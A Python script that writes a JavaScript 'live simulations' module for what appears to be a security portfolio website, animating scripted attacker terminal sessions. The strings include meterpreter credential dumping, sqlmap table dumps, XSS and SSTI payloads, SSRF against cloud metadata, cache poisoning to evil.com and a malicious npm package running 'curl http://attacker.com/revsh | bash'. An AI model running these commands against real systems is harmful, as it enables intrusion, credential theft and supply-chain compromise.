import os

js_path = 'd:/abdo_portfolio/build/js/methodology.js'

with open(js_path, 'r', encoding='utf-8') as f:
    content = f.read()

# Find the marker
marker = "// Live Simulations Engine"
idx = content.find(marker)
if idx != -1:
    content = content[:idx]

new_js = """// Live Simulations Engine
const simulationScripts = {
  apt: [
    { text: "root@kali:~# msfconsole -q", type: "cmd", delay: 800 },
    { text: "msf6 > use exploit/multi/handler", type: "cmd", delay: 500 },
    { text: "msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp", type: "cmd", delay: 600 },
    { text: "PAYLOAD => windows/x64/meterpreter/reverse_tcp", delay: 200 },
    { text: "msf6 exploit(multi/handler) > exploit -j", type: "cmd", delay: 400 },
    { text: "[*] Exploit running as background job 0.", delay: 300 },
    { text: "[*] Started reverse TCP handler on 10.0.0.5:4444", delay: 1000 },
    { text: "[*] Sending stage (200262 bytes) to 10.0.0.102", delay: 500 },
    { text: "[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.102:49156)", type: "cmd", delay: 1200 },
    { text: "meterpreter > load kiwi", type: "cmd", delay: 800 },
    { text: "Loading extension kiwi...Success.", delay: 400 },
    { text: "meterpreter > creds_all", type: "cmd", delay: 1000 },
    { text: "[+] Running as SYSTEM", type: "cmd", delay: 300 },
    { text: "Retrieving all credentials...", delay: 500 },
    { text: "Username    Domain   Password", delay: 100 },
    { text: "--------    ------   --------", delay: 100 },
    { text: "Administrator CORP     Winter2025!", type: "err", delay: 500 },
    { text: "meterpreter > shell", type: "cmd", delay: 700 },
    { text: "C:\\\\Windows\\\\system32> net use \\\\\\\\DC01\\\\C$ /user:CORP\\\\Administrator Winter2025!", type: "cmd", delay: 1500 },
    { text: "The command completed successfully.", delay: 400 },
    { text: "C:\\\\Windows\\\\system32> echo APT_OWNED > \\\\\\\\DC01\\\\C$\\\\owned.txt", type: "cmd", delay: 800 },
    { text: "[!!!] DOMAIN CONTROLLER COMPROMISED [!!!]", type: "err", delay: 1000 }
  ],
  nmap: [
    { text: "root@kali:~# nmap -p- -sC -sV --min-rate=1000 target.com", type: "cmd", delay: 600 },
    { text: "Starting Nmap 7.93 ( https://nmap.org )", delay: 300 },
    { text: "NSE: Loaded 155 scripts for scanning.", delay: 100 },
    { text: "Initiating Ping Scan...", delay: 200 },
    { text: "Initiating SYN Stealth Scan...", delay: 400 },
    { text: "Discovered open port 80/tcp on 192.168.1.5", delay: 200 },
    { text: "Discovered open port 443/tcp on 192.168.1.5", delay: 100 },
    { text: "Discovered open port 22/tcp on 192.168.1.5", delay: 150 },
    { text: "Discovered open port 3306/tcp on 192.168.1.5", type: "warn", delay: 300 },
    { text: "Initiating Service scan...", delay: 500 },
    { text: "PORT     STATE SERVICE  VERSION", type: "cmd", delay: 100 },
    { text: "22/tcp   open  ssh      OpenSSH 8.2p1", delay: 100 },
    { text: "80/tcp   open  http     nginx 1.18.0", delay: 100 },
    { text: "443/tcp  open  ssl/http nginx 1.18.0", delay: 100 },
    { text: "3306/tcp open  mysql    MySQL 5.7.33", type: "err", delay: 500 },
    { text: "| mysql-info:", type: "warn", delay: 200 },
    { text: "|   Protocol: 10", type: "warn", delay: 100 },
    { text: "|   Version: 5.7.33", type: "warn", delay: 100 },
    { text: "|_  Salt: ********************", type: "warn", delay: 100 },
    { text: "[*] Nmap done: 1 IP address scanned in 12.4 seconds", delay: 800 }
  ],
  ffuf: [
    { text: "root@kali:~# ffuf -u https://target.com/FUZZ -w SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403", type: "cmd", delay: 500 },
    { text: "        /'___\\  /'___\\           /'___\\       ", type: "warn", delay: 100 },
    { text: "       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       ", type: "warn", delay: 100 },
    { text: "       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      ", type: "warn", delay: 100 },
    { text: "        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      ", type: "warn", delay: 100 },
    { text: "         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       ", type: "warn", delay: 100 },
    { text: "          \\/_/    \\/_/   \\/___/    \\/_/       ", type: "warn", delay: 100 },
    { text: "       v2.0.0-dev", type: "warn", delay: 400 },
    { text: "________________________________________________", delay: 200 },
    { text: " :: Method           : GET", delay: 100 },
    { text: " :: URL              : https://target.com/FUZZ", delay: 100 },
    { text: " :: Wordlist         : FUZZ: raft-medium-directories.txt", delay: 100 },
    { text: "________________________________________________", delay: 400 },
    { text: "admin                   [Status: 403, Size: 153, Words: 12, Lines: 5, Duration: 42ms]", type: "err", delay: 600 },
    { text: "api                     [Status: 200, Size: 3123, Words: 412, Lines: 12, Duration: 39ms]", delay: 200 },
    { text: "login                   [Status: 200, Size: 1843, Words: 212, Lines: 45, Duration: 40ms]", delay: 300 },
    { text: ".git/config             [Status: 200, Size: 112, Words: 15, Lines: 10, Duration: 45ms]", type: "err", delay: 800 },
    { text: "backup.zip              [Status: 200, Size: 1542312, Words: 0, Lines: 0, Duration: 120ms]", type: "err", delay: 500 },
    { text: ":: Progress: [30000/30000] :: Job [1/1] :: 1200 req/sec :: Duration: [0:00:25] ::", delay: 600 }
  ],
  sqlmap: [
    { text: "root@kali:~# sqlmap -u \"https://target.com/product?id=1\" --dbs --batch --random-agent", type: "cmd", delay: 500 },
    { text: "        ___", type: "warn", delay: 100 },
    { text: "       __H__", type: "warn", delay: 100 },
    { text: " ___ ___[,]_____ ___ ___  {1.6.4#stable}", type: "warn", delay: 100 },
    { text: "|_ -| . [']     | .'| . |", type: "warn", delay: 100 },
    { text: "|___|_  [.]_|_|_|__,|  _|", type: "warn", delay: 100 },
    { text: "      |_|V...       |_|   https://sqlmap.org", type: "warn", delay: 400 },
    { text: "[*] starting @ 10:45:12", delay: 200 },
    { text: "[10:45:13] [INFO] testing connection to the target URL", delay: 300 },
    { text: "[10:45:14] [INFO] checking if the target is protected by some kind of WAF/IPS", delay: 400 },
    { text: "[10:45:15] [INFO] testing if GET parameter 'id' is dynamic", delay: 500 },
    { text: "[10:45:16] [WARNING] heuristic (basic) test shows that GET parameter 'id' might be injectable", type: "warn", delay: 600 },
    { text: "[10:45:17] [INFO] testing for SQL injection on GET parameter 'id'", delay: 400 },
    { text: "[10:45:19] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable", type: "err", delay: 1200 },
    { text: "[10:45:20] [INFO] the back-end DBMS is MySQL", delay: 200 },
    { text: "web server operating system: Linux Ubuntu", delay: 100 },
    { text: "web application technology: Nginx 1.18.0, PHP 7.4.3", delay: 100 },
    { text: "back-end DBMS: MySQL >= 5.0.12", delay: 300 },
    { text: "[10:45:22] [INFO] fetching database names", delay: 400 },
    { text: "available databases [3]:", type: "cmd", delay: 500 },
    { text: "[*] information_schema", delay: 100 },
    { text: "[*] target_store_db", type: "err", delay: 100 },
    { text: "[*] mysql", delay: 100 },
    { text: "root@kali:~# sqlmap -u \"https://target.com/product?id=1\" -D target_store_db -T users --dump", type: "cmd", delay: 1500 },
    { text: "[10:45:30] [INFO] fetching entries for table 'users'", delay: 500 },
    { text: "Database: target_store_db\nTable: users\n[2 entries]", type: "cmd", delay: 400 },
    { text: "+----+-------------+----------------------------------+", type: "warn", delay: 100 },
    { text: "| id | username    | password_hash                    |", type: "warn", delay: 100 },
    { text: "+----+-------------+----------------------------------+", type: "warn", delay: 100 },
    { text: "| 1  | admin       | 5f4dcc3b5aa765d61d8327deb882cf99 |", type: "err", delay: 200 },
    { text: "| 2  | jsmith      | 12b1d3d65aa765d61d8327deb88223d1 |", type: "err", delay: 200 },
    { text: "+----+-------------+----------------------------------+", type: "warn", delay: 100 }
  ],
  xss: [
    { text: "root@kali:~# dalfox url https://target.com/search?q=test -b https://bxsshunter.com/xss", type: "cmd", delay: 500 },
    { text: "    _..._      DALFOX", type: "warn", delay: 100 },
    { text: "  .'     '.    Parameter Analysis and XSS Scanner", type: "warn", delay: 100 },
    { text: " /  _   _  \\   Based on Golang", type: "warn", delay: 100 },
    { text: " | (o)_(o) |   ", type: "warn", delay: 100 },
    { text: " \\  .-.-.  /   ", type: "warn", delay: 100 },
    { text: "  '. \\_/ .'    ", type: "warn", delay: 400 },
    { text: "[*] Target: https://target.com/search?q=test", delay: 200 },
    { text: "[*] BAV: https://bxsshunter.com/xss", delay: 200 },
    { text: "[*] Method: GET", delay: 100 },
    { text: "[*] Worker: 100", delay: 100 },
    { text: "[I] Start XSS Scanning..", delay: 500 },
    { text: "[I] Check param: q", delay: 300 },
    { text: "[V] Reflected Payload: '><script>alert(1)</script>", type: "err", delay: 600 },
    { text: "[V] Triggered XSS payload [q] = '\"><svg/onload=alert(1)>", type: "err", delay: 500 },
    { text: "[I] Injecting Blind XSS Payloads...", delay: 800 },
    { text: "[V] Triggered Blind XSS payload [q] = '\"><script src=https://bxsshunter.com/xss></script>", type: "err", delay: 600 },
    { text: "==================================================", delay: 100 },
    { text: "[WAITING] Listening for Blind XSS Callbacks on bxsshunter.com...", type: "cmd", delay: 1500 },
    { text: "[ALERT] BLIND XSS FIRED!", type: "err", delay: 2000 },
    { text: "Execution Time: 2026-06-17 14:30:22", type: "err", delay: 100 },
    { text: "URL: https://target.com/admin/dashboard", type: "err", delay: 100 },
    { text: "IP: 192.168.1.100", type: "err", delay: 100 },
    { text: "Cookies: session_id=s3cr3t_4dm1n_t0k3n_12345; __Secure-Auth=true", type: "err", delay: 200 }
  ],
  darkweb: [
    { text: "root@kali:~# tor --RunAsDaemon 1", type: "cmd", delay: 500 },
    { text: "Starting Tor 0.4.7.13...", delay: 400 },
    { text: "Bootstrapped 100% (done): Done", delay: 600 },
    { text: "root@kali:~# python3 scrape_ransomware_blogs.py --target \"Corp Inc\"", type: "cmd", delay: 800 },
    { text: "[*] Connecting to Tor Proxy at 127.0.0.1:9050...", delay: 400 },
    { text: "[*] Connected. Your IP is 194.22.x.x (Exit Node)", delay: 300 },
    { text: "[*] Checking LockBit 3.0 Onion Site...", delay: 1200 },
    { text: "[!] Target 'Corp Inc' NOT found on LockBit.", delay: 400 },
    { text: "[*] Checking BlackBasta Onion Site...", delay: 1500 },
    { text: "[!!!] TARGET MATCH FOUND: Corp Inc", type: "err", delay: 800 },
    { text: "    -> 250GB Data Leaked.", type: "err", delay: 200 },
    { text: "    -> Status: PUBLISHED.", type: "err", delay: 200 },
    { text: "    -> Price: FREE DOWNLOAD.", type: "err", delay: 200 },
    { text: "[*] Fetching file tree from leak directory...", delay: 900 },
    { text: "FOUND: /IT_Backups/aws_credentials.txt", type: "warn", delay: 400 },
    { text: "FOUND: /HR/employee_passwords.xlsx", type: "warn", delay: 300 },
    { text: "FOUND: /DevOps/source_code.zip", type: "warn", delay: 200 },
    { text: "root@kali:~# cat /tmp/aws_credentials.txt", type: "cmd", delay: 1500 },
    { text: "aws_access_key_id=AKIAIOSFODNN7EXAMPLE", type: "err", delay: 100 },
    { text: "aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", type: "err", delay: 100 }
  ],
  recon: [
    { text: "root@kali:~# subfinder -d target.com -all -silent | tee subs.txt", type: "cmd", delay: 500 },
    { text: "               __    _____           __         ", type: "warn", delay: 100 },
    { text: "   ________  _/ /_  / __(_)___  ____/ /__  _____", type: "warn", delay: 100 },
    { text: "  / ___/ / / / __ \\/ /_/ / __ \\/ __  / _ \\/ ___/", type: "warn", delay: 100 },
    { text: " (__  ) /_/ / /_/ / __/ / / / / /_/ /  __/ /    ", type: "warn", delay: 100 },
    { text: "/____/\\__,_/_.___/_/ /_/_/ /_/\\__,_/\\___/_/     ", type: "warn", delay: 100 },
    { text: "ProjectDiscovery v2.6.4", type: "warn", delay: 400 },
    { text: "[INF] Enumerating subdomains for target.com", delay: 500 },
    { text: "www.target.com", delay: 200 },
    { text: "api.target.com", delay: 100 },
    { text: "mail.target.com", delay: 100 },
    { text: "jira.target.com", delay: 100 },
    { text: "root@kali:~# amass enum -passive -d target.com -silent >> subs.txt", type: "cmd", delay: 1000 },
    { text: "Starting Amass Enumeration...", delay: 500 },
    { text: "dev-admin.target.com", type: "err", delay: 1500 },
    { text: "internal-api-v2.target.com", type: "err", delay: 200 },
    { text: "internal-vpn.target.com", type: "err", delay: 200 },
    { text: "root@kali:~# cat subs.txt | sort -u | httpx -silent -title -tech-detect -status-code | tee alive.txt", type: "cmd", delay: 1200 },
    { text: "    __    __  __       _  __", type: "warn", delay: 100 },
    { text: "   / /_  / /_/ /_____ | |/ /", type: "warn", delay: 100 },
    { text: "  / __ \\/ __/ __/ __ \\|   / ", type: "warn", delay: 100 },
    { text: " / / / / /_/ /_/ /_/ /   |  ", type: "warn", delay: 100 },
    { text: "/_/ /_/\\__/\\__/ .___/_/|_|  ", type: "warn", delay: 100 },
    { text: "             /_/            ", type: "warn", delay: 100 },
    { text: "https://api.target.com [200] [JSON API] [Nginx, Node.js]", delay: 400 },
    { text: "https://jira.target.com [200] [Jira Login] [Atlassian Jira]", delay: 200 },
    { text: "https://dev-admin.target.com [403] [Forbidden] [Nginx]", type: "warn", delay: 200 },
    { text: "https://internal-api-v2.target.com [200] [Swagger UI] [Express]", type: "err", delay: 300 },
    { text: "https://internal-vpn.target.com [200] [GlobalProtect Portal] [Palo Alto]", type: "err", delay: 200 },
    { text: "root@kali:~# nuclei -l alive.txt -t cves/ -t exposed-panels/ -t misconfiguration/ -severity critical,high", type: "cmd", delay: 1500 },
    { text: "                     __     _", type: "warn", delay: 100 },
    { text: "   ____  __  _______/ /__  (_)", type: "warn", delay: 100 },
    { text: "  / __ \\/ / / / ___/ / _ \\/ / ", type: "warn", delay: 100 },
    { text: " / / / / /_/ / /__/ /  __/ /  ", type: "warn", delay: 100 },
    { text: "/_/ /_/\\__,_/\\___/_/\\___/_/   ", type: "warn", delay: 100 },
    { text: "[*] Loaded 2415 templates...", delay: 400 },
    { text: "[swagger-api] [info] [http] https://internal-api-v2.target.com/api-docs", type: "warn", delay: 800 },
    { text: "[paloalto-globalprotect-portal] [info] [http] https://internal-vpn.target.com/", type: "warn", delay: 500 },
    { text: "[CVE-2024-3400] [critical] [http] https://internal-vpn.target.com/ => PAN-OS Command Injection", type: "err", delay: 1200 },
    { text: "[jira-cve-2022-26134] [critical] [http] https://jira.target.com/ => Atlassian Jira OGNL RCE", type: "err", delay: 600 },
    { text: "[!!!] CRITICAL VULNERABILITIES FOUND DURING RECON [!!!]", type: "err", delay: 800 }
  ],
  api: [
    { text: "root@kali:~# kr scan https://api.target.com -w routes-large.kite", type: "cmd", delay: 600 },
    { text: "    _  ___ __", type: "warn", delay: 100 },
    { text: "   / |/ (_) /____  _______  ______  ____  ___  _____", type: "warn", delay: 100 },
    { text: "  /    / / __/ _ \\/ ___/ / / / __ \\/ __ \\/ _ \\/ ___/", type: "warn", delay: 100 },
    { text: " / /| / / /_/  __/ /  / /_/ / / / / / / /  __/ /    ", type: "warn", delay: 100 },
    { text: "/_/ |_/_/\\__/\\___/_/   \\__,_/_/ /_/_/ /_/\\___/_/     ", type: "warn", delay: 100 },
    { text: "v1.0.2 - Assetnote", type: "warn", delay: 300 },
    { text: "[*] Loaded 124,103 routes from kite file.", delay: 400 },
    { text: "[*] Starting scan...", delay: 200 },
    { text: "GET     401 [41B] https://api.target.com/v1/users", delay: 300 },
    { text: "POST    401 [41B] https://api.target.com/v1/users", delay: 100 },
    { text: "GET     200 [1.2KB] https://api.target.com/v1/health", delay: 400 },
    { text: "POST    403 [112B] https://api.target.com/v2/admin", type: "err", delay: 600 },
    { text: "POST    200 [512B] https://api.target.com/v2/admin/debug", type: "err", delay: 500 },
    { text: "root@kali:~# curl -X POST https://api.target.com/v2/admin/debug", type: "cmd", delay: 1000 },
    { text: "{\"status\":\"success\", \"debug_token\":\"sys_admin_9918237192837\"}", type: "err", delay: 800 }
  ],
  ssrf: [
    { text: "root@kali:~# curl -v \"https://target.com/webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"", type: "cmd", delay: 600 },
    { text: "*   Trying 192.168.1.100:443...", delay: 100 },
    { text: "* Connected to target.com (192.168.1.100) port 443 (#0)", delay: 200 },
    { text: "> GET /webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1", delay: 100 },
    { text: "> Host: target.com", delay: 100 },
    { text: "> Accept: */*", delay: 100 },
    { text: "< HTTP/1.1 200 OK", delay: 600 },
    { text: "< Content-Type: text/plain", delay: 100 },
    { text: "production-s3-access-role", type: "err", delay: 300 },
    { text: "root@kali:~# curl \"https://target.com/webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/production-s3-access-role\"", type: "cmd", delay: 1200 },
    { text: "{", type: "err", delay: 500 },
    { text: "  \"Code\" : \"Success\",", type: "err", delay: 100 },
    { text: "  \"AccessKeyId\" : \"ASIAX...\",", type: "err", delay: 100 },
    { text: "  \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiC...\",", type: "err", delay: 100 },
    { text: "  \"Token\" : \"IQoJb3JpZ2luX2VjEJv...\",", type: "err", delay: 100 },
    { text: "  \"Expiration\" : \"2026-06-17T20:30:00Z\"", type: "err", delay: 100 },
    { text: "}", type: "err", delay: 100 },
    { text: "[!!!] CLOUD ACCOUNT COMPROMISED [!!!]", type: "err", delay: 800 }
  ],
  ssti: [
    { text: "root@kali:~# python3 tplmap.py -u \"https://target.com/profile?name=John\"", type: "cmd", delay: 500 },
    { text: "[+] Tplmap 0.5", type: "warn", delay: 200 },
    { text: "[+] Testing if parameter 'name' is injectable", delay: 400 },
    { text: "[*] Smarty: testing...", delay: 200 },
    { text: "[*] Jinja2: testing...", delay: 200 },
    { text: "[+] Jinja2 plugin has confirmed injection with tag '{{*}}'", type: "err", delay: 600 },
    { text: "[+] Tplmap identified the following injection point:", delay: 200 },
    { text: "    GET parameter: name", delay: 100 },
    { text: "    Engine: Jinja2", delay: 100 },
    { text: "    Injection: {{%s}}", delay: 100 },
    { text: "    OS: Linux", delay: 100 },
    { text: "root@kali:~# python3 tplmap.py -u \"https://target.com/profile?name=John\" --os-shell", type: "cmd", delay: 1000 },
    { text: "[+] Run commands on the operating system.", delay: 500 },
    { text: "linux $ id", type: "cmd", delay: 800 },
    { text: "uid=0(root) gid=0(root) groups=0(root)", type: "err", delay: 400 },
    { text: "linux $ cat /etc/shadow", type: "cmd", delay: 800 },
    { text: "root:$6$XYZ123$abc...:18750:0:99999:7:::", type: "err", delay: 500 },
    { text: "linux $ ", type: "cmd", delay: 400 }
  ],
  race: [
    { text: "[*] Turbo Intruder: Loaded script race_condition.py", type: "warn", delay: 500 },
    { text: "[*] Target: POST https://target.com/api/apply_coupon", delay: 200 },
    { text: "[*] Payload: {\"coupon_code\": \"WELCOME50\"}", delay: 200 },
    { text: "[*] Executing Single-Packet Attack (20 requests in 1 TCP packet)...", delay: 600 },
    { text: "Req #1  -> Status: 200, Resp: {\"success\": true, \"balance\": 50}", delay: 300 },
    { text: "Req #2  -> Status: 200, Resp: {\"success\": true, \"balance\": 100}", type: "err", delay: 100 },
    { text: "Req #3  -> Status: 200, Resp: {\"success\": true, \"balance\": 150}", type: "err", delay: 100 },
    { text: "Req #4  -> Status: 200, Resp: {\"success\": true, \"balance\": 200}", type: "err", delay: 100 },
    { text: "... (15 requests later)", delay: 400 },
    { text: "Req #20 -> Status: 200, Resp: {\"success\": true, \"balance\": 1000}", type: "err", delay: 200 },
    { text: "[!!!] RACE CONDITION EXPLOITED: Balance multiplied by 20!", type: "err", delay: 800 }
  ],
  cache: [
    { text: "root@kali:~# ruby paraminer.rb -u \"https://target.com/\"", type: "cmd", delay: 500 },
    { text: "[*] Paraminer v1.2 initialized", delay: 200 },
    { text: "[*] Bruteforcing HTTP headers...", delay: 500 },
    { text: "[!] Found Unkeyed Header: X-Forwarded-Host", type: "err", delay: 1200 },
    { text: "[*] Testing Cache Poisoning...", delay: 800 },
    { text: "root@kali:~# curl -H \"X-Forwarded-Host: evil.com\" https://target.com/ -i", type: "cmd", delay: 1000 },
    { text: "HTTP/1.1 200 OK", delay: 400 },
    { text: "X-Cache: MISS", delay: 100 },
    { text: "<html><script src=\"https://evil.com/app.js\"></script></html>", type: "err", delay: 300 },
    { text: "root@kali:~# curl https://target.com/ -i", type: "cmd", delay: 800 },
    { text: "HTTP/1.1 200 OK", delay: 400 },
    { text: "X-Cache: HIT", type: "err", delay: 100 },
    { text: "<html><script src=\"https://evil.com/app.js\"></script></html>", type: "err", delay: 300 },
    { text: "[!!!] CACHE POISONED! All visitors will load evil.com/app.js!", type: "err", delay: 600 }
  ],
  supply: [
    { text: "root@kali:~# npm init -y", type: "cmd", delay: 400 },
    { text: "Wrote to /tmp/target-internal-auth/package.json", delay: 200 },
    { text: "root@kali:~# cat index.js", type: "cmd", delay: 500 },
    { text: "const exec = require('child_process').exec;", type: "warn", delay: 100 },
    { text: "exec('curl http://attacker.com/revsh | bash');", type: "warn", delay: 100 },
    { text: "root@kali:~# npm publish", type: "cmd", delay: 800 },
    { text: "+ target-internal-auth@99.9.9", type: "err", delay: 1200 },
    { text: "[*] Malicious package published with ultra-high version.", delay: 400 },
    { text: "==================================================", delay: 100 },
    { text: "[WAITING] Listening for callbacks on attacker.com:443...", type: "cmd", delay: 1500 },
    { text: "Connection received from 54.21.x.x (Target CI/CD Pipeline)", type: "err", delay: 2500 },
    { text: "target-ci@jenkins:/app$ id", type: "cmd", delay: 500 },
    { text: "uid=1001(target-ci) gid=1001(docker)", type: "err", delay: 200 },
    { text: "[!!!] SUPPLY CHAIN COMPROMISED [!!!]", type: "err", delay: 500 }
  ]
};

let currentTypingInterval = null;
let printLineTimeout = null;

function launchSimulation(scriptId) {
  const overlay = document.getElementById('terminal-overlay');
  const output = document.getElementById('terminal-output');
  if(!overlay || !output) return;
  
  const script = simulationScripts[scriptId];
  if(!script) {
     if (scriptId === 'apt' && !simulationScripts['apt']) return;
  }

  overlay.classList.add('active');
  output.innerHTML = '';
  
  if (currentTypingInterval) clearInterval(currentTypingInterval);
  if (printLineTimeout) clearTimeout(printLineTimeout);
  
  let i = 0;
  function printLine() {
    if(i >= script.length) return;
    const line = script[i];
    const p = document.createElement('div');
    if(line.type === 'cmd') p.className = 'term-cmd';
    else if(line.type === 'err') p.className = 'term-err';
    else if(line.type === 'warn') p.className = 'term-warn';
    else p.style.color = '#0f0';
    
    p.style.whiteSpace = 'pre-wrap';
    output.appendChild(p);
    
    let charIdx = 0;
    currentTypingInterval = setInterval(() => {
      p.textContent += line.text.charAt(charIdx);
      charIdx++;
      output.scrollTop = output.scrollHeight;
      if(charIdx >= line.text.length) {
        clearInterval(currentTypingInterval);
        i++;
        printLineTimeout = setTimeout(printLine, line.delay);
      }
    }, 12);
  }
  printLine();
}

function launchAPT() {
  launchSimulation('apt');
}

function closeTerminal() {
  document.getElementById('terminal-overlay').classList.remove('active');
  if (currentTypingInterval) clearInterval(currentTypingInterval);
  if (printLineTimeout) clearTimeout(printLineTimeout);
}
"""

with open(js_path, 'w', encoding='utf-8') as f:
    f.write(content + "\n" + new_js)
